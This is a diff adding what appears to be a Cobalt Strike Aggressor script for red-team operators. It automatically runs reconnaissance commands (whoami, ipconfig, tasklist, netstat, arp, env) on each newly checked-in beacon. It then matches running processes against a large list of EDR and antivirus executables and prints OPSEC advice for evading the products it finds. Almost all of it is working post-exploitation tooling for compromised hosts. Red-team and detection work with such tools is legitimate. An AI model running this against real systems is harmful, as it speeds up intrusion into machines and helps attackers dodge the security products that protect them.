@@ -1,0 +1,726 @@
+# =====================================================
+# ACRT Situational Awareness (SA) Auto-Run Script
+# =====================================================
+# Automatically executes reconnaissance commands when
+# a new beacon checks in. Commands are queued and
+# dispatched one per callback cycle to reduce network
+# noise and avoid flooding the beacon with tasks.
+#
+# Built-in Beacon commands are routed to their native
+# Aggressor functions. Any unrecognized command falls
+# through to fireAlias(), allowing loaded BOFs to be
+# called by their registered alias name.
+#
+# Includes EDR detection that parses tasklist output
+# automatically - no additional commands executed.
+#
+# Usage:
+#   1. Load this script via Script Manager.
+#   2. Ensure any BOF scripts are loaded BEFORE this one
+#      so their aliases are registered.
+#   3. Add or remove commands in the queue array below.
+#
+# Adding new commands:
+#   - Built-in:  Add the command string and a matching
+#                 route in the if/else block.
+#   - BOF/Alias: Just add the alias name (with args if
+#                 needed). It will be handled by fireAlias().
+#
+# Examples:
+#   "net dclist"          -> bnet($bid, "dclist")
+#   ""               -> fireAlias($bid, "", "")
+#   "arp"                 -> fireAlias($bid, "arp", "")
+#   "nslookup 10.0.0.1"  -> fireAlias($bid, "nslookup", "10.0.0.1")
+# =====================================================
+
+
+# =====================================================
+# Global Variables
+# =====================================================
+
+# Beacon ID -> array of queued commands
+global('%sa_queue');
+
+# Beacon ID -> flag indicating tasklist output expected
+global('%awaiting_tasklist');
+
+# Host -> detected EDR products
+global('%edr_results');
+
+# EDR process signatures
+global('%edr_processes');
+
+# =====================================================
+# EDR Process Definitions
+# =====================================================
+
+%edr_processes = %();
+
+# Microsoft Defender / MDE
+%edr_processes["msmpeng.exe"] = "Microsoft Defender";
+%edr_processes["MsSense.exe"] = "Microsoft Defender for Endpoint";
+%edr_processes["sensecncproxy.exe"] = "Microsoft Defender for Endpoint";
+%edr_processes["mssecflt.exe"] = "Microsoft Defender";
+%edr_processes["securityhealthservice.exe"] = "Windows Security Health";
+%edr_processes["securityhealthhost.exe"] = "Windows Security Health";
+%edr_processes["mpcmdrun.exe"] = "Microsoft Defender";
+%edr_processes["configsecuritypolicy.exe"] = "Microsoft Defender";
+%edr_processes["senseIR.exe"] = "Microsoft Defender for Endpoint";
+%edr_processes["SenseNdr.exe"] = "Microsoft Defender for Endpoint (NDR)";
+%edr_processes["sensesampleuploader.exe"] = "Microsoft Defender for Endpoint";
+%edr_processes["sensecm.exe"] = "Microsoft Defender for Endpoint";
+%edr_processes["senseirprovider.exe"] = "Microsoft Defender for Endpoint";
+%edr_processes["mssensesm.exe"] = "Microsoft Defender for Endpoint";
+%edr_processes["mssensesc.exe"] = "Microsoft Defender for Endpoint";
+%edr_processes["mdesensclient.exe"] = "Microsoft Defender for Endpoint";
+%edr_processes["mdecoreworker.exe"] = "Microsoft Defender for Endpoint";
+
+# CrowdStrike
+%edr_processes["csfalconservice.exe"] = "CrowdStrike Falcon";
+%edr_processes["csfalconcontainer.exe"] = "CrowdStrike Falcon";
+%edr_processes["csagent.exe"] = "CrowdStrike Falcon";
+%edr_processes["falconhost.exe"] = "CrowdStrike Falcon";
+%edr_processes["csdevicecontrol.exe"] = "CrowdStrike Falcon";
+%edr_processes["cswspapi.exe"] = "CrowdStrike Falcon";
+
+# SentinelOne
+%edr_processes["sentinelagent.exe"] = "SentinelOne";
+%edr_processes["sentinelctl.exe"] = "SentinelOne";
+%edr_processes["sentinelone.exe"] = "SentinelOne";
+%edr_processes["sentinelhelper.exe"] = "SentinelOne";
+%edr_processes["sentinelstaticengine.exe"] = "SentinelOne";
+%edr_processes["sentinelstaticenginescanner.exe"] = "SentinelOne";
+%edr_processes["sentinelagentworker.exe"] = "SentinelOne";
+%edr_processes["sentinelservicehost.exe"] = "SentinelOne";
+%edr_processes["sentinelui.exe"] = "SentinelOne";
+
+# Carbon Black (VMware)
+%edr_processes["cb.exe"] = "Carbon Black";
+%edr_processes["cbcomms.exe"] = "Carbon Black";
+%edr_processes["cbdefense.exe"] = "Carbon Black Defense";
+%edr_processes["cbdefenseservice.exe"] = "Carbon Black Defense";
+%edr_processes["reptile.exe"] = "Carbon Black";
+%edr_processes["cbdaemon.exe"] = "Carbon Black";
+%edr_processes["repmgr.exe"] = "Carbon Black";
+%edr_processes["repux.exe"] = "Carbon Black";
+%edr_processes["repwsc.exe"] = "Carbon Black";
+%edr_processes["cbsensor.exe"] = "Carbon Black";
+
+# Palo Alto Cortex XDR
+%edr_processes["cyserver.exe"] = "Cortex XDR";
+%edr_processes["cytray.exe"] = "Cortex XDR";
+%edr_processes["traps.exe"] = "Palo Alto Traps";
+%edr_processes["trapsd.exe"] = "Palo Alto Traps";
+%edr_processes["cyveraservice.exe"] = "Cortex XDR";
+%edr_processes["cyveraconsole.exe"] = "Cortex XDR";
+%edr_processes["xagt.exe"] = "Cortex XDR";
+%edr_processes["cortexagent.exe"] = "Cortex XDR";
+
+# Cylance (Blackberry)
+%edr_processes["cylancesvc.exe"] = "Cylance";
+%edr_processes["cylanceui.exe"] = "Cylance";
+%edr_processes["cylanceprotectsetup.exe"] = "Cylance";
+%edr_processes["cylanceoptics.exe"] = "Cylance Optics";
+%edr_processes["cyoptics.exe"] = "Cylance Optics";
+%edr_processes["cyupdate.exe"] = "Cylance";
+
+# Symantec / Broadcom SEP
+%edr_processes["ccsvchst.exe"] = "Symantec Endpoint Protection";
+%edr_processes["rtvscan.exe"] = "Symantec Endpoint Protection";
+%edr_processes["smcgui.exe"] = "Symantec Endpoint Protection";
+%edr_processes["smc.exe"] = "Symantec Endpoint Protection";
+%edr_processes["snac.exe"] = "Symantec Network Access Control";
+%edr_processes["sepwscsvc64.exe"] = "Symantec Endpoint Protection";
+%edr_processes["semsvc.exe"] = "Symantec Endpoint Protection";
+%edr_processes["sepliveupdate.exe"] = "Symantec Endpoint Protection";
+%edr_processes["sepcsvc.exe"] = "Symantec Endpoint Protection";
+
+# McAfee / Trellix
+%edr_processes["mcshield.exe"] = "McAfee";
+%edr_processes["mfetp.exe"] = "McAfee Endpoint Security";
+%edr_processes["mfemactl.exe"] = "McAfee";
+%edr_processes["mfemms.exe"] = "McAfee";
+%edr_processes["mfevtps.exe"] = "McAfee";
+%edr_processes["masvc.exe"] = "McAfee Agent";
+%edr_processes["mfefire.exe"] = "McAfee Firewall";
+%edr_processes["mfecanary.exe"] = "McAfee";
+%edr_processes["mfeatp.exe"] = "McAfee ATP";
+%edr_processes["mfeesp.exe"] = "McAfee Endpoint Security";
+%edr_processes["trellix.exe"] = "Trellix";
+
+# Sophos
+%edr_processes["savservice.exe"] = "Sophos";
+%edr_processes["sophosav.exe"] = "Sophos";
+%edr_processes["sophosui.exe"] = "Sophos";
+%edr_processes["sophoshealth.exe"] = "Sophos";
+%edr_processes["sophosfs.exe"] = "Sophos";
+%edr_processes["sophosssp.exe"] = "Sophos";
+%edr_processes["sophosntpservice.exe"] = "Sophos";
+%edr_processes["hmpalert.exe"] = "Sophos Intercept X";
+%edr_processes["sophoscleanup.exe"] = "Sophos";
+%edr_processes["sophosfilescanner.exe"] = "Sophos";
+%edr_processes["sophoslivequery.exe"] = "Sophos";
+%edr_processes["savapi.exe"] = "Sophos";
+%edr_processes["sdcservice.exe"] = "Sophos";
+%edr_processes["sophosips.exe"] = "Sophos";
+%edr_processes["sophosthreat.exe"] = "Sophos";
+%edr_processes["sophoscbedrsensor.exe"] = "Sophos XDR";
+
+# Trend Micro
+%edr_processes["tmntsrv.exe"] = "Trend Micro";
+%edr_processes["tmccsf.exe"] = "Trend Micro";
+%edr_processes["ntrtscan.exe"] = "Trend Micro OfficeScan";
+%edr_processes["tmlisten.exe"] = "Trend Micro";
+%edr_processes["tmbmsrv.exe"] = "Trend Micro";
+%edr_processes["ds_agent.exe"] = "Trend Micro Deep Security";
+%edr_processes["coreserviceshell.exe"] = "Trend Micro";
+%edr_processes["pccntmon.exe"] = "Trend Micro";
+%edr_processes["tmproxy.exe"] = "Trend Micro";
+%edr_processes["tmiacagent.exe"] = "Trend Micro";
+%edr_processes["tmpfw.exe"] = "Trend Micro Firewall";
+%edr_processes["endpointbasecamp.exe"] = "Trend Micro Apex One";
+
+# ESET
+%edr_processes["egui.exe"] = "ESET";
+%edr_processes["ekrn.exe"] = "ESET";
+%edr_processes["essvc.exe"] = "ESET";
+%edr_processes["eguiproxy.exe"] = "ESET";
+%edr_processes["epfw.exe"] = "ESET Firewall";
+%edr_processes["epfwlwf.exe"] = "ESET Firewall";
+%edr_processes["eamonm.exe"] = "ESET";
+%edr_processes["epcuamdr.exe"] = "ESET EDR";
+%edr_processes["eei_agent.exe"] = "ESET Inspect (EDR)";
+
+# Kaspersky
+%edr_processes["avp.exe"] = "Kaspersky";
+%edr_processes["avpui.exe"] = "Kaspersky";
+%edr_processes["kavfs.exe"] = "Kaspersky";
+%edr_processes["kavfswh.exe"] = "Kaspersky";
+%edr_processes["kavfsgt.exe"] = "Kaspersky";
+%edr_processes["klnagent.exe"] = "Kaspersky";
+%edr_processes["avpsus.exe"] = "Kaspersky";
+%edr_processes["kavtray.exe"] = "Kaspersky";
+%edr_processes["klif.exe"] = "Kaspersky";
+%edr_processes["klfphc.exe"] = "Kaspersky";
+
+# Bitdefender
+%edr_processes["bdagent.exe"] = "Bitdefender";
+%edr_processes["bdservicehost.exe"] = "Bitdefender";
+%edr_processes["bdredline.exe"] = "Bitdefender";
+%edr_processes["epag.exe"] = "Bitdefender";
+%edr_processes["epintegrationservice.exe"] = "Bitdefender";
+%edr_processes["epsecurityservice.exe"] = "Bitdefender";
+%edr_processes["bdntwrk.exe"] = "Bitdefender";
+%edr_processes["bdwtxag.exe"] = "Bitdefender";
+%edr_processes["epconsole.exe"] = "Bitdefender GravityZone";
+
+# Elastic Security
+%edr_processes["elastic-agent.exe"] = "Elastic Agent";
+%edr_processes["elastic-endpoint.exe"] = "Elastic Endpoint";
+%edr_processes["winlogbeat.exe"] = "Elastic Winlogbeat";
+%edr_processes["filebeat.exe"] = "Elastic Filebeat";
+%edr_processes["metricbeat.exe"] = "Elastic Metricbeat";
+%edr_processes["auditbeat.exe"] = "Elastic Auditbeat";
+%edr_processes["packetbeat.exe"] = "Elastic Packetbeat";
+
+# Tanium
+%edr_processes["taniumclient.exe"] = "Tanium";
+%edr_processes["taniumdetectengine.exe"] = "Tanium";
+%edr_processes["taniumendpointindex.exe"] = "Tanium";
+%edr_processes["taniumexechwrap.exe"] = "Tanium";
+%edr_processes["taniumfileinfo.exe"] = "Tanium";
+
+# FireEye / Trellix / Mandiant
+%edr_processes["xagt.exe"] = "FireEye/Trellix Endpoint Agent";
+%edr_processes["fireeye.exe"] = "FireEye";
+%edr_processes["mandiantagent.exe"] = "Mandiant";
+%edr_processes["mandianthxagent.exe"] = "Mandiant HX";
+%edr_processes["fireeye_helix.exe"] = "FireEye Helix";
+
+# Cybereason
+%edr_processes["cybereason.exe"] = "Cybereason";
+%edr_processes["activeconsole.exe"] = "Cybereason";
+%edr_processes["crssvc.exe"] = "Cybereason";
+%edr_processes["cybereasonransomfree.exe"] = "Cybereason RansomFree";
+%edr_processes["executionpreventionservice.exe"] = "Cybereason";
+%edr_processes["minionhost.exe"] = "Cybereason";
+
+# Fortinet FortiEDR
+%edr_processes["fortiedr.exe"] = "FortiEDR";
+%edr_processes["forticollector.exe"] = "FortiEDR";
+%edr_processes["fortiedrservice.exe"] = "FortiEDR";
+%edr_processes["fortitraceagent.exe"] = "FortiEDR";
+%edr_processes["forticlientmonitor.exe"] = "FortiClient";
+%edr_processes["forticlient.exe"] = "FortiClient";
+
+# Malwarebytes
+%edr_processes["mbam.exe"] = "Malwarebytes";
+%edr_processes["mbamservice.exe"] = "Malwarebytes";
+%edr_processes["mbamtray.exe"] = "Malwarebytes";
+%edr_processes["mbampt.exe"] = "Malwarebytes";
+%edr_processes["mbae.exe"] = "Malwarebytes Anti-Exploit";
+%edr_processes["mbae64.exe"] = "Malwarebytes Anti-Exploit";
+%edr_processes["mbamswissarmy.exe"] = "Malwarebytes";
+
+# Avast / AVG
+%edr_processes["avgsvc.exe"] = "AVG";
+%edr_processes["avgui.exe"] = "AVG";
+%edr_processes["avastsvc.exe"] = "Avast";
+%edr_processes["avastui.exe"] = "Avast";
+%edr_processes["afwserv.exe"] = "Avast Firewall";
+%edr_processes["avgsvcx.exe"] = "AVG";
+%edr_processes["aswidsagent.exe"] = "Avast";
+
+# Huntress
+%edr_processes["huntressagent.exe"] = "Huntress";
+%edr_processes["huntressupdater.exe"] = "Huntress";
+%edr_processes["huntressrioagent.exe"] = "Huntress";
+
+# Rapid7 InsightIDR / InsightAgent
+%edr_processes["ir_agent.exe"] = "Rapid7 Insight Agent";
+%edr_processes["rapid7_agent.exe"] = "Rapid7";
+%edr_processes["rapid7_endpoint_broker.exe"] = "Rapid7";
+
+# Qualys
+%edr_processes["qualysagent.exe"] = "Qualys";
+%edr_processes["qualyscloudagent.exe"] = "Qualys";
+%edr_processes["qagentservice.exe"] = "Qualys";
+
+# Webroot
+%edr_processes["wrsa.exe"] = "Webroot";
+%edr_processes["wrsvc.exe"] = "Webroot";
+%edr_processes["webroot.exe"] = "Webroot";
+
+# Comodo
+%edr_processes["cmdagent.exe"] = "Comodo";
+%edr_processes["cavwp.exe"] = "Comodo";
+%edr_processes["cis.exe"] = "Comodo Internet Security";
+%edr_processes["cmdvirth.exe"] = "Comodo";
+
+# F-Secure
+%edr_processes["fsav32.exe"] = "F-Secure";
+%edr_processes["fsavgui.exe"] = "F-Secure";
+%edr_processes["fsgk32.exe"] = "F-Secure";
+%edr_processes["fsma32.exe"] = "F-Secure";
+%edr_processes["fssm32.exe"] = "F-Secure";
+%edr_processes["fsorsp.exe"] = "F-Secure";
+%edr_processes["fsorspclient.exe"] = "F-Secure";
+%edr_processes["fsdevcon.exe"] = "F-Secure";
+%edr_processes["fsscoeservice.exe"] = "F-Secure";
+
+# G Data
+%edr_processes["gdsc.exe"] = "G Data";
+%edr_processes["gdscan.exe"] = "G Data";
+%edr_processes["avkwctl.exe"] = "G Data";
+%edr_processes["avkproxy.exe"] = "G Data";
+%edr_processes["avk.exe"] = "G Data";
+
+# Cisco Secure Endpoint (AMP)
+%edr_processes["sfc.exe"] = "Cisco Secure Endpoint";
+%edr_processes["cisco_amp.exe"] = "Cisco AMP";
+%edr_processes["ampsvc.exe"] = "Cisco AMP";
+%edr_processes["ampfirepowerapi.exe"] = "Cisco AMP";
+%edr_processes["ciscoamp.exe"] = "Cisco AMP";
+%edr_processes["cscmpsvc.exe"] = "Cisco Secure Endpoint";
+
+# Check Point
+%edr_processes["epa.exe"] = "Check Point Endpoint Security";
+%edr_processes["cpda.exe"] = "Check Point";
+%edr_processes["cpca.exe"] = "Check Point";
+%edr_processes["epwd.exe"] = "Check Point Endpoint Security";
+%edr_processes["eppolicy.exe"] = "Check Point";
+%edr_processes["vna_utils.exe"] = "Check Point";
+%edr_processes["sandblastbrowser.exe"] = "Check Point SandBlast";
+%edr_processes["eps.exe"] = "Check Point Endpoint Security";
+
+# Deep Instinct
+%edr_processes["deepinstinctsvc.exe"] = "Deep Instinct";
+%edr_processes["deepinstinct.exe"] = "Deep Instinct";
+%edr_processes["diagent.exe"] = "Deep Instinct";
+
+# BlackBerry / Protect
+%edr_processes["bbprotect.exe"] = "BlackBerry Protect";
+%edr_processes["bbprotect64.exe"] = "BlackBerry Protect";
+
+# LimaCharlie
+%edr_processes["rphcp.exe"] = "LimaCharlie";
+
+# Wazuh
+%edr_processes["wazuh-agent.exe"] = "Wazuh";
+%edr_processes["wazuh-agent-service.exe"] = "Wazuh";
+%edr_processes["ossec-agent.exe"] = "Wazuh (OSSEC)";
+
+# OSSEC
+%edr_processes["ossec.exe"] = "OSSEC";
+
+# Harfanglab
+%edr_processes["harfanglabedr.exe"] = "Harfanglab";
+%edr_processes["hurukaiedr.exe"] = "Harfanglab";
+
+# WithSecure (F-Secure Business)
+%edr_processes["fssense.exe"] = "WithSecure";
+%edr_processes["withsecure.exe"] = "WithSecure";
+
+# N-able / SolarWinds
+%edr_processes["edrservice.exe"] = "N-able EDR";
+%edr_processes["solarwindsagent.exe"] = "SolarWinds";
+%edr_processes["solarwinds_agent.exe"] = "SolarWinds";
+
+# Secureworks / Taegis
+%edr_processes["taegisagent.exe"] = "Secureworks Taegis";
+%edr_processes["secureworks.exe"] = "Secureworks";
+%edr_processes["redcloak.exe"] = "Secureworks Red Cloak";
+
+# Acronis
+%edr_processes["acronisagent.exe"] = "Acronis Cyber Protect";
+%edr_processes["acroniscyberprotect.exe"] = "Acronis Cyber Protect";
+%edr_processes["acronis_mms.exe"] = "Acronis";
+
+# Panda Security / WatchGuard
+%edr_processes["panda_url_filtering.exe"] = "Panda Security";
+%edr_processes["psanhost.exe"] = "Panda Security";
+%edr_processes["psuamain.exe"] = "Panda Security";
+%edr_processes["psuaservice.exe"] = "Panda Security";
+%edr_processes["watchguard.exe"] = "WatchGuard";
+%edr_processes["wgedr.exe"] = "WatchGuard EDR";
+
+# Norton / Broadcom
+%edr_processes["nsservice.exe"] = "Norton Security";
+%edr_processes["nortonsecurity.exe"] = "Norton Security";
+%edr_processes["ns.exe"] = "Norton Security";
+
+# Avira
+%edr_processes["avira.servicehost.exe"] = "Avira";
+%edr_processes["avshadow.exe"] = "Avira";
+%edr_processes["avguard.exe"] = "Avira";
+%edr_processes["avgnt.exe"] = "Avira";
+
+# Windows Built-in
+%edr_processes["smartscreen.exe"] = "Windows SmartScreen";
+%edr_processes["mrt.exe"] = "Microsoft Malicious Software Removal Tool";
+
+# Splunk
+%edr_processes["splunkd.exe"] = "Splunk Forwarder";
+%edr_processes["splunk.exe"] = "Splunk";
+%edr_processes["splunkforwarder.exe"] = "Splunk Universal Forwarder";
+
+# Sysmon (Sysinternals)
+%edr_processes["sysmon.exe"] = "Sysmon";
+%edr_processes["sysmon64.exe"] = "Sysmon";
+
+# SIEM Agents / Other Logging
+%edr_processes["nxlog.exe"] = "NXLog";
+%edr_processes["snare.exe"] = "Snare Agent";
+%edr_processes["logrhythmagent.exe"] = "LogRhythm";
+%edr_processes["lragent.exe"] = "LogRhythm";
+%edr_processes["alienvault_agent.exe"] = "AlienVault";
+%edr_processes["osqueryd.exe"] = "osquery";
+%edr_processes["osqueryi.exe"] = "osquery";
+%edr_processes["velociraptor.exe"] = "Velociraptor";
+
+# Vectra
+%edr_processes["vectra.exe"] = "Vectra AI";
+%edr_processes["vectraagent.exe"] = "Vectra AI";
+
+# ExtraHop
+%edr_processes["extrahopagent.exe"] = "ExtraHop";
+
+# Darktrace
+%edr_processes["darktraceagent.exe"] = "Darktrace";
+%edr_processes["darktrace.exe"] = "Darktrace";
+
+
+# =====================================================
+# Event: New beacon checks in
+# =====================================================
+
+on beacon_initial {
+    local('$bid');
+    $bid = $1;
+    
+    blog($bid, "\c9[*] SA queued - one command per callback");
+    
+    # Define the SA command queue for this beacon.
+    # Commands execute in order, one per check-in cycle.
+    # "edr_check" is a pseudo-command that triggers EDR parsing
+    %sa_queue[$bid] = @(
+        "whoami",
+        "pwd",
+        "ipconfig",
+        "tasklist",
+        "netstat",
+        "arp",
+        "ls",
+        "env",
+        "drives",
+        "edr_check"
+    );
+    
+    # Initialize tasklist tracking
+    %awaiting_tasklist[$bid] = false;
+    
+    # Dispatch the first command immediately.
+    run_next_sa($bid);
+}
+
+
+# =====================================================
+# Event: Beacon calls home
+# =====================================================
+
+on beacon_checkin {
+    run_next_sa($1);
+}
+
+
+# =====================================================
+# Event: Beacon output received
+# =====================================================
+
+on beacon_output {
+    local('$bid $output');
+    $bid = $1;
+    $output = $2;
+    
+    # Check if we're waiting for tasklist output from this beacon
+    if (%awaiting_tasklist[$bid] == true) {
+        parse_for_edr($bid, $output);
+        %awaiting_tasklist[$bid] = false;
+    }
+}
+
+
+# =====================================================
+# Sub: Dispatch next SA command
+# =====================================================
+
+sub run_next_sa {
+    local('$bid $cmd @parts $base $args');
+    $bid = $1;
+    
+    # Exit if no queue exists for this beacon.
+    if (%sa_queue[$bid] is $null) { return; }
+    
+    # Queue empty — SA is done, clean up.
+    if (size(%sa_queue[$bid]) == 0) {
+        blog($bid, "\c9[*] SA complete.");
+        %sa_queue[$bid] = $null;
+        return;
+    }
+    
+    # Pop the next command off the front of the queue.
+    $cmd = %sa_queue[$bid][0];
+    %sa_queue[$bid] = sublist(%sa_queue[$bid], 1);
+    
+    # Split into base command and arguments.
+    @parts = split(" ", $cmd, 2);
+    $base  = @parts[0];
+    $args  = "";
+    if (size(@parts) > 1) {
+        $args = @parts[1];
+    }
+    
+    blog($bid, "\c9[*] SA (" . size(%sa_queue[$bid]) . " remaining): " . $cmd);
+    
+    # Route to built-in Beacon commands.
+    if      ($base eq "getuid") { bgetuid($bid); }
+    else if ($base eq "pwd")    { bpwd($bid); }
+    else if ($base eq "ps")     { bps($bid); }
+    else if ($base eq "net")    { bnet($bid, $args); }
+    else if ($base eq "ls")     { bls($bid, $args); }
+    else if ($base eq "drives") { bdrives($bid); }
+    
+    # Pseudo-command: EDR check (no command, just report)
+    else if ($base eq "edr_check") {
+        report_edr_status($bid);
+    }
+    
+    # Flag tasklist so we capture output for EDR parsing
+    else if ($base eq "tasklist") {
+        %awaiting_tasklist[$bid] = true;
+        fireAlias($bid, $base, $args);
+    }
+    
+    # Fallback: treat as a BOF or alias command.
+    else {
+        fireAlias($bid, $base, $args);
+    }
+}
+
+
+# =====================================================
+# Sub: Parse tasklist output for EDR processes
+# =====================================================
+
+sub parse_for_edr {
+    local('$bid $output @lines $line $proc_lower %detected $host');
+    $bid = $1;
+    $output = $2;
+    $host = beacon_info($bid, "computer");
+    
+    %detected = %();
+    @lines = split("\n", $output);
+    
+    foreach $line (@lines) {
+        $line = lc($line);
+        
+        foreach $process (keys(%edr_processes)) {
+            $proc_lower = lc($process);
+            if ($proc_lower isin $line) {
+                %detected[%edr_processes[$process]] = $process;
+            }
+        }
+    }
+    
+    # Store results for this host
+    %edr_results[$host] = %detected;
+}
+
+
+# =====================================================
+# Sub: Report EDR status to beacon console
+# =====================================================
+
+sub report_edr_status {
+    local('$bid $host %detected $alert');
+    $bid = $1;
+    $host = beacon_info($bid, "computer");
+    
+    if ($host in keys(%edr_results)) {
+        %detected = %edr_results[$host];
+        
+        if (size(%detected) > 0) {
+            $alert = "\n";
+            $alert .= "========================================\n";
+            $alert .= "  [!] EDR/AV DETECTED ON " . $host . "\n";
+            $alert .= "========================================\n";
+            
+            foreach $product (keys(%detected)) {
+                $alert .= "  [!] " . $product . " (" . %detected[$product] . ")\n";
+            }
+            
+            $alert .= "========================================\n";
+            $alert .= "  OPSEC Recommendations:\n";
+            $alert .= "  - Avoid fork-and-run where possible\n";
+            $alert .= "  - Use BOFs for post-ex\n";
+            $alert .= "  - Review sleep/jitter settings\n";
+            $alert .= "  - Consider process injection carefully\n";
+            $alert .= "========================================\n";
+            
+            berror($bid, $alert);
+        } else {
+            blog($bid, "\c9[+] EDR Check: No known EDR/AV detected");
+        }
+    } else {
+        blog($bid, "\c9[*] EDR Check: No tasklist data available");
+    }
+}
+
+
+# =====================================================
+# Helper: Get all EDR summary
+# =====================================================
+
+sub get_all_edr_summary {
+    local('$report $host %products');
+    
+    $report = "";
+    $report .= "============================================\n";
+    $report .= "  EDR/AV Detection Summary - All Hosts\n";
+    $report .= "============================================\n\n";
+    
+    if (size(%edr_results) == 0) {
+        $report .= "  No scan results available.\n";
+    } else {
+        foreach $host (keys(%edr_results)) {
+            %products = %edr_results[$host];
+            
+            $report .= "  " . $host . "\n";
+            $report .= "  " . "-" x 35 . "\n";
+            
+            if (size(%products) > 0) {
+                foreach $product (keys(%products)) {
+                    $report .= "    [!] " . $product . "\n";
+                }
+            } else {
+                $report .= "    [+] No EDR/AV detected\n";
+            }
+            $report .= "\n";
+        }
+    }
+    
+    $report .= "============================================\n";
+    
+    return $report;
+}
+
+
+# =====================================================
+# Menu Registration
+# =====================================================
+
+popup reporting {
+    menu "EDR Detection" {
+        item "View All Hosts" {
+            local('$report $dialog');
+            $report = get_all_edr_summary();
+            
+            $dialog = dialog("EDR Detection Summary", %(report => $report), &edr_dialog_callback);
+            dialog_description($dialog, "EDR/AV detected across all hosts");
+            drow_text_area($dialog, "report", 25, 60);
+            dbutton_action($dialog, "Copy");
+            dbutton_action($dialog, "Close");
+            dialog_show($dialog);
+        }
+        
+        item "Clear Results" {
+            %edr_results = %();
+            show_message("EDR detection results cleared.");
+        }
+    }
+}
+
+sub edr_dialog_callback {
+    local('$dialog $button $values');
+    $dialog = $1;
+    $button = $2;
+    $values = $3;
+    
+    if ($button eq "Copy") {
+        clipboard($values["report"]);
+        show_message("Copied to clipboard");
+    }
+}
+
+
+# =====================================================
+# Beacon Right-Click Menu
+# =====================================================
+
+popup beacon_bottom {
+    menu "EDR Tools" {
+        item "View EDR Status" {
+            local('$bid $host %products $msg');
+            foreach $bid ($1) {
+                $host = beacon_info($bid, "computer");
+                
+                if ($host in keys(%edr_results)) {
+                    %products = %edr_results[$host];
+                    
+                    if (size(%products) > 0) {
+                        $msg = "[!] EDR detected on " . $host . ":\n";
+                        foreach $product (keys(%products)) {
+                            $msg .= "    - " . $product . "\n";
+                        }
+                        berror($bid, $msg);
+                    } else {
+                        blog($bid, "\c9[+] No EDR detected on " . $host);
+                    }
+                } else {
+                    blog($bid, "\c9[*] No tasklist data for " . $host);
+                }
+            }
+        }
+    }
+}
+
